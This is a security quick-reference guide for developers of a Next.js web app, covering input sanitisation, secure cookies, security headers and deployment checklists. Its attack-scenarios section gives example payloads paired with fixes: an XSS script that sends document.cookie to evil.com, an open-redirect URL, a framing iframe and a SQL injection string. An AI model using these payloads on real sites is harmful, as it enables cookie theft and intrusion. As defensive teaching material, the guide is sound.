# 🔒 SECURITY QUICK REFERENCE GUIDE

## 🎯 FOR DEVELOPERS

### ✅ DO's

#### Input Handling

```typescript
// ✅ ALWAYS sanitize user input
import { sanitizeTextInput, validateEmail } from "@/lib/security";

const userInput = sanitizeTextInput(rawInput, 1000);
if (!validateEmail(email)) {
  return error("Invalid email");
}
```

#### URL Handling

```typescript
// ✅ ALWAYS validate URLs
import { sanitizeUrl } from "@/lib/security";

const safeUrl = sanitizeUrl(userProvidedUrl);
if (!safeUrl) {
  return error("Invalid URL");
}
```

#### External Links

```tsx
// ✅ ALWAYS use noopener noreferrer
<a href={url} target="_blank" rel="noopener noreferrer">
  Link
</a>
```

#### Cookies

```typescript
// ✅ ALWAYS use secure flags
import { setSecureCookie } from "@/lib/security";

setSecureCookie("name", "value", {
  maxAge: 86400,
  sameSite: "lax",
});
```

#### LocalStorage

```typescript
// ✅ ALWAYS use SecureStorage wrapper
import { SecureStorage } from "@/lib/security";

SecureStorage.setItem("key", "value");
const value = SecureStorage.getItem("key");
```

---

### ❌ DON'Ts

#### Never Trust User Input

```typescript
// ❌ NEVER use raw user input
const url = `https://api.com?name=${userInput}`;

// ✅ ALWAYS sanitize
const url = `https://api.com?name=${encodeURIComponent(sanitizeTextInput(userInput))}`;
```

#### Never Use Dangerous Functions

```typescript
// ❌ NEVER use these
eval(userInput);
new Function(userInput);
innerHTML = userInput;
document.write(userInput);

// ✅ ALWAYS use safe alternatives
const parsed = safeJsonParse(userInput, {});
element.textContent = userInput; // Auto-escaped
```

#### Never Expose Secrets

```typescript
// ❌ NEVER commit secrets
const apiKey = "sk_live_1234567890";

// ✅ ALWAYS use environment variables
const apiKey = process.env.API_KEY;
```

#### Never Skip Validation

```typescript
// ❌ NEVER skip validation
submitForm(formData);

// ✅ ALWAYS validate first
if (validateForm(formData)) {
  submitForm(formData);
}
```

---

## 🛡️ SECURITY UTILITIES REFERENCE

### Input Validation

```typescript
import { sanitizeTextInput, validateEmail, validateName, validatePhoneNumber, sanitizePhoneNumber } from "@/lib/security";

// Text input (removes HTML, limits length)
const safeName = sanitizeTextInput(input, 100, false);

// Email validation (RFC 5322 compliant)
if (validateEmail(email)) {
  /* valid */
}

// Name validation (letters, spaces, hyphens only)
if (validateName(name)) {
  /* valid */
}

// Phone validation
if (validatePhoneNumber(phone)) {
  /* valid */
}
const cleanPhone = sanitizePhoneNumber(phone);
```

### XSS Prevention

```typescript
import { escapeHtml, stripHtmlTags } from "@/lib/security";

// Escape HTML entities
const safe = escapeHtml("<script>alert(1)</script>");
// Result: "&lt;script&gt;alert(1)&lt;/script&gt;"

// Strip all HTML tags
const plain = stripHtmlTags("<b>Hello</b>");
// Result: "Hello"
```

### URL Security

```typescript
import { sanitizeUrl } from "@/lib/security";

// Validates and whitelists domains
const safeUrl = sanitizeUrl(userUrl);
if (!safeUrl) {
  // URL was blocked (dangerous protocol or non-whitelisted domain)
}

// Whitelisted domains:
// - wa.me, api.whatsapp.com
// - instagram.com, facebook.com, tiktok.com
// - github.com, vercel.com
```

### Secure Storage

```typescript
import { SecureStorage } from "@/lib/security";

// Set item (auto-sanitizes)
SecureStorage.setItem("preference", "dark-mode");

// Get item (validates for XSS)
const value = SecureStorage.getItem("preference");

// Remove item
SecureStorage.removeItem("preference");
```

### Rate Limiting

```typescript
import { checkRateLimit } from "@/lib/security";

const result = checkRateLimit("form-submit", 5, 60000);
if (!result.allowed) {
  showError(`Wait ${result.retryAfter}s before trying again`);
  return;
}
```

---

## 🚨 COMMON ATTACK SCENARIOS & MITIGATIONS

### 1. XSS (Cross-Site Scripting)

**Attack:**

```javascript
// Attacker enters in form:
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
```

**Protection:**

```typescript
// ✅ React auto-escapes
<div>{userInput}</div>; // Safe

// ✅ Use sanitization
const safe = sanitizeTextInput(userInput);
```

### 2. Open Redirect

**Attack:**

```javascript
// Attacker crafts URL:
?redirect=https://phishing-site.com
```

**Protection:**

```typescript
// ✅ Validate redirect URLs
const safeRedirect = sanitizeUrl(redirectParam);
if (!safeRedirect) {
  redirect("/"); // Default safe location
}
```

### 3. Clickjacking

**Attack:**

```html
<!-- Attacker embeds your site -->
<iframe src="https://yoursite.com"></iframe>
```

**Protection:**

```javascript
// ✅ Headers in next.config.mjs
"X-Frame-Options": "SAMEORIGIN"
"Content-Security-Policy": "frame-ancestors 'self'"
```

### 4. Cookie Theft

**Attack:**

```javascript
// Via XSS
document.cookie; // Steal cookies
```

**Protection:**

```typescript
// ✅ Secure cookies
setSecureCookie("name", "value", {
  sameSite: "lax", // Prevents CSRF
  // Secure flag auto-added on HTTPS
});
```

### 5. SQL Injection

**Attack:**

```sql
' OR '1'='1' --
```

**Protection:**

```typescript
// ✅ N/A - No database in this app
// When adding backend: Use parameterized queries/ORM
```

---

## 🔍 PRE-COMMIT CHECKLIST

Before committing code:

- [ ] No `console.log()` statements
- [ ] All user inputs sanitized
- [ ] All URLs validated
- [ ] No hardcoded secrets
- [ ] External links have `rel="noopener noreferrer"`
- [ ] TypeScript errors resolved
- [ ] Security utilities used where needed
- [ ] No `eval()` or `Function()` constructor
- [ ] No `dangerouslySetInnerHTML` (except layout.tsx)
- [ ] Rate limiting applied to forms

---

## 🚀 DEPLOYMENT CHECKLIST

### Pre-Production

```bash
# 1. Audit dependencies
pnpm audit

# 2. Build successfully
pnpm build

# 3. Check for TypeScript errors (if enabled)
pnpm run type-check

# 4. Test security headers
# Visit: https://securityheaders.com/?q=yoursite.com

# 5. Test CSP compliance
# Check browser console for CSP violations
```

### Production Environment Variables

```bash
# .env.production
NEXT_PUBLIC_WHATSAPP_NUMBER=6281234567890
NEXT_PUBLIC_BUSINESS_NAME="Laundry Modern"
# ... other public env vars

# ⚠️ Never commit .env files!
```

### Post-Deployment Tests

```bash
# 1. Test XSS
# Input: <script>alert(1)</script> in all forms

# 2. Test open redirect
# Try: ?redirect=https://evil.com

# 3. Test cookie security
# DevTools → Application → Cookies
# Verify: Secure, SameSite flags

# 4. Test CSP
# DevTools → Console
# Check for CSP violations

# 5. Test HTTPS
# Verify: HTTPS enforced, no mixed content
```

---

## 📋 SECURITY HEADERS REFERENCE

```javascript
// next.config.mjs
headers: [
  {
    // Enforces HTTPS for 2 years
    key: "Strict-Transport-Security",
    value: "max-age=63072000; includeSubDomains; preload",
  },
  {
    // Prevents clickjacking
    key: "X-Frame-Options",
    value: "SAMEORIGIN",
  },
  {
    // Prevents MIME sniffing
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    // XSS protection
    key: "X-XSS-Protection",
    value: "1; mode=block",
  },
  {
    // Referrer policy
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin",
  },
  {
    // Feature policy
    key: "Permissions-Policy",
    value: "camera=(), microphone=(), geolocation=()",
  },
  {
    // Content Security Policy
    key: "Content-Security-Policy",
    value: "...", // See next.config.mjs
  },
];
```

---

## 🆘 EMERGENCY RESPONSE

### If Vulnerability Discovered

1. **Immediate Actions:**

   ```bash
   # 1. Document the issue
   # 2. Assess severity (CVSS calculator)
   # 3. Determine if exploit is active
   ```

2. **Quick Fix:**

   ```bash
   # 1. Apply patch
   # 2. Test thoroughly
   # 3. Deploy immediately
   git add .
   git commit -m "SECURITY: Fix [vulnerability type]"
   git push
   ```

3. **Post-Incident:**
   - Update SECURITY_AUDIT_REPORT.md
   - Notify team
   - Document lessons learned

---

## 📞 RESOURCES

### Tools

- [OWASP ZAP](https://www.zaproxy.org/) - Security scanner
- [Burp Suite](https://portswigger.net/burp) - Penetration testing
- [SecurityHeaders.com](https://securityheaders.com/) - Header checker
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - CSP validator

### Learning

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Academy](https://portswigger.net/web-security)
- [Web Security Academy](https://www.websecurity.training/)

### Updates

- Run `pnpm audit` monthly
- Subscribe to security advisories
- Monitor CVE databases

---

## 🏆 SECURITY RATING

Current Status: **🟢 HARDENED (8.4/10)**

Maintain this rating by:

- ✅ Using security utilities consistently
- ✅ Following this guide
- ✅ Regular security audits
- ✅ Keeping dependencies updated
- ✅ Testing before deployment

---

**Last Updated:** February 12, 2026  
**Maintainer:** Security Team  
**Review Frequency:** Quarterly
